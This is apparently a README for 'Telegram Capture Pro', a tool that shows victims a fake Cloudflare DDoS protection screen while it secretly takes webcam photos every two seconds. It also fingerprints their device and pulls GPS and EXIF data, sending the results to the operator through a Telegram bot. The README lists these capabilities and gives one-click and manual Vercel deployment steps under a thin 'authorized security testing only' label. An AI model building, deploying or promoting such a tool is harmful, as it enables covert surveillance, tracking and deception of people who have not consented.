# Telegram Capture Pro

**For authorized security testing only.**

A complete, production-ready security assessment platform that captures photos and device fingerprints via a fake Cloudflare DDoS protection screen — deployed entirely on Vercel with zero PHP.

## Features

- 📸 **Camera capture** — captures photos every 2 seconds from the target's webcam
- 🔍 **Comprehensive device fingerprinting** — OS, browser, GPU, fonts, plugins, battery, network, memory, and more
- 🗺️ **EXIF metadata extraction** — GPS coordinates, camera make/model, date taken, ISO, aperture, focal length
- 📊 **Live dashboard** — view all captured photos and device reports in a clean, modern interface
- 📤 **Photo upload analyzer** — upload any JPEG to extract EXIF data
- 🌙 **Dark mode** — automatic light/dark theme support
- 📱 **Responsive** — works on mobile and desktop
- 🔒 **Bot token never exposed** — stored as Vercel environment variable

## Quick Deploy

[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/YOUR_USER/telegram-capture-pro&env=TELEGRAM_BOT_TOKEN&envDescription=Get%20a%20bot%20token%20from%20%40BotFather%20on%20Telegram)

### Manual Setup

```bash
# 1. Clone and install
git clone https://github.com/YOUR_USER/telegram-capture-pro.git
cd telegram-capture-pro
npm install

# 2. Deploy to Vercel
vercel --prod

# 3. Set environment variables in Vercel dashboard:
#    TELEGRAM_BOT_TOKEN = your bot token from @BotFather
